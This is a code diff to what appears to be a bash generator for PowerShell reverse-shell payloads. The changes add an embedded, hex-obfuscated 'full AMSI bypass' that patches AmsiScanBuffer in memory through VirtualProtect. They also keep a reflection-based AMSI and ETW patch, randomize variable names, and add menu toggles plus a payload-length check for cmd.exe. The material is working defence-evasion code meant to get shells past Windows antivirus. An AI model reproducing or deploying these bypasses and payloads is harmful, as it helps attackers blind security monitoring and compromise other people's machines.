@@ -617,7 +617,7 @@ else
 fi
 
 
-
+bp=$(openssl rand -hex $(shuf -i 1-2 -n1))
 client=$(openssl rand -hex $(shuf -i 1-11 -n1))
 stream=$(openssl rand -hex $(shuf -i 1-11 -n1))
 data=$(openssl rand -hex $(shuf -i 1-11 -n1))
@@ -696,8 +696,14 @@ then
     windows=1
     win="-W!${space}!Hidden"
     at="@"
-    #"Mini-AMSI-bypass and ETW-patch"
-    AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);(([Reflection.Assembly]::LoadWithPartialName('System.Core').GetTypes()|?{\$_-clike'*i*'}).GetFields(4*13)|?{\$_-clike'*m_e*d'}).SetValue((([Ref].Assembly.GetTypes()|?{\$_-clike'*E*r'}).GetFields(104)|?{\$_-clike'*t*w*r'}).GetValue($null),0) "
+    #AMSI-bypass and EWT-patch
+    AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);(([Reflection.Assembly]::LoadWithPartialName('System.Core').GetTypes()|?{\$_-clike'*i*'}).GetFields(4*13)|?{\$_-clike'*m_e*d'}).SetValue((([Ref].Assembly.GetTypes()|?{\$_-clike'*E*r'}).GetFields(104)|?{\$_-clike'*t*w*r'}).GetValue(\$null),0);"
+      
+      if [[ "$emfullamsi" == 1 ]] 
+        then  
+            AMSIb="$AMSIb\$$bp=\"2457203d2040220a7573696e672053797374656d3b0a7573696e672053797374656d2e52756e74696d652e496e7465726f7053657276696365733b0a7075626c696320636c6173732057696e3332207b0a5b446c6c496d706f727428226b65726e656c333222295d0a7075626c6963207374617469632065787465726e20496e745074722047657450726f634164647265737328496e7450747220684d6f64756c652c20737472696e672070726f634e616d65293b0a5b446c6c496d706f727428226b65726e656c333222295d0a7075626c6963207374617469632065787465726e20496e74507472204c6f61644c69627261727928737472696e67206e616d65293b0a5b446c6c496d706f727428226b65726e656c333222295d0a7075626c6963207374617469632065787465726e20626f6f6c205669727475616c50726f7465637428496e74507472206c70416464726573732c2055496e7450747220647753697a652c2075696e7420666c4e657750726f746563742c206f75742075696e74206c70666c4f6c6450726f74656374293b0a7d0a22400a4164642d547970652024570a244c3d205b57696e33325d3a3a4c6f61644c6962726172792822616d22202b202273692e646c6c22290a2441203d205b57696e33325d3a3a47657450726f634164647265737328244c2c2022416d7322202b2022695363616e22202b202242756666657222290a2470203d20300a5b57696e33325d3a3a5669727475616c50726f746563742824412c205b75696e7433325d352c20307834302c205b7265665d2470290a2470203d205b427974655b5d5d2028307842382c20307835372c20307830302c20307830372c20307838302c2030784333290a5b52756e74696d652e496e7465726f7053657276696365732e4d61727368616c5d3a3a436f70792824702c20302c2024412c203629\";\$$bp=\$$bp -split '(..)' -ne ''|% {[char][byte]\"0x\$_\"};iex(\$$bp=\$$bp -join '');"
+        fi      
+
 else 
     windows=0 
   
@@ -1710,6 +1716,17 @@ function listen () {
 header
 printf "The following has been copied to your clipboard:\n\n"
 echo "$rev"
+
+payload_length=$(echo -n $rev|wc -c)
+echo
+echo "The payload is $payload_length characters"
+if [[ "$payload_length" -gt 8191 ]]
+then
+    echo
+    echo "This is more than the 8191 characters command-line string limitation in Windows Command prompt (cmd.exe). You need to shorten it, or alter it to run directly from PowerShell instead of cmd.exe"
+    
+fi
+
 printf "\n\n"
 if [[ $1 == "udp" ]]
 then
@@ -2207,6 +2224,10 @@ if [ "$poshproto" == "" ]
 then
     poshproto="tcp"
 fi
+if [ "emfullamsi" == "" ]
+then
+    emfullamsi=1
+fi
 header
     echo -ne "
 $(blueprint 'Powershell')
@@ -2254,13 +2275,24 @@ fi
 
 if [ "$fullamsi" == 1 ]
 then 
-    echo -ne "\n$(greenprint 'f)') Download/run full AMSI bypass - $(redprint "On") $aurl"
+    echo -ne "\n$(greenprint 'd)') Download/run full AMSI bypass - $(redprint "On") $aurl"
     
 else 
-    echo -ne "\n$(greenprint 'f)') Download/run full AMSI bypass - $(blueprint 'Off')"
+    echo -ne "\n$(greenprint 'd)') Download/run full AMSI bypass - $(blueprint 'Off')"
     fullamsi=0
     
 fi
+
+if [ "$emfullamsi" == 1 ]
+then 
+    echo -ne "\n$(greenprint 'f)') Embedded full AMSI bypass - $(redprint "On") "
+    
+else 
+    echo -ne "\n$(greenprint 'f)') Embedded full AMSI bypass - $(blueprint 'Off')"
+    emfullamsi=0
+    
+fi
+
 echo -e "\n$(greenprint 'p)') Protocol [$(yellowprint $poshproto)]"
 echo -ne "\n$(greenprint 'a)') About Options"
 echo 
@@ -2336,7 +2368,7 @@ Choose an option:  "
         fi
         submenu_powershell
         ;;
-    f)
+    d)
         if [ $fullamsi == 0 ]
         then 
             fullamsi=1
@@ -2346,6 +2378,16 @@ Choose an option:  "
             
         else 
             fullamsi=0
+        fi
+        submenu_powershell
+        ;;
+    f)
+        if [ $emfullamsi == 0 ]
+        then 
+            emfullamsi=1
+                        
+        else 
+            emfullamsi=0
         fi
         submenu_powershell
         ;;
